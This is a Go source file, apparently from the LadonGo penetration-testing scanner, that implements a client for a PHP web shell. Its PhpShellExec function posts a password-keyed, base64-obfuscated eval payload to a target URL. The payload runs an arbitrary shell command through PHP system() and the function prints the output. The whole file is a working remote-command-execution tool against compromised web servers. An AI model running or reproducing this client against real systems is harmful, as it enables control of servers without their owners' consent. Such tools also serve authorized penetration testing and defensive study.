package rexec
//Ladon Scanner for golang 
//Author: k8gege
//K8Blog: http://k8gege.org/Ladon
//Github: https://github.com/k8gege/LadonGo
import (
	_"compress/gzip"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
	"strings"
)
var PhpShellHelp = func () {
    fmt.Println("Usage: Ladon PhpShell url pwd cmd")
	fmt.Println("Example: Ladon PhpShell http://192.168.1.8/1.php pass whoami")
}

func PhpShellExec(url,pwd,cmdline string) {
	payload := "echo '<result>';&"+cmdline+"&echo '</result>';"
	encodeString := base64.StdEncoding.EncodeToString([]byte(payload))
	//data :=`tom=phpinfo();`
	//req, _ := http.NewRequest("POST", url, strings.NewReader(data))
	data :=pwd+`=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&z1=Y21k&z2=`
	req, _ := http.NewRequest("POST", url, strings.NewReader(data+encodeString))
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept-Encoding", "gzip,deflate")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Println("error")
	}
	body, err := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(body))
	reg := regexp.MustCompile(`->\|(?s:(.*?))\|<-`)
	if reg == nil {
		fmt.Println("regex error")
		return
	}
	str := string(body)
	result := reg.FindAllStringSubmatch(str,-1)
	for _, text := range result {
		fmt.Println(text[1])
	}
}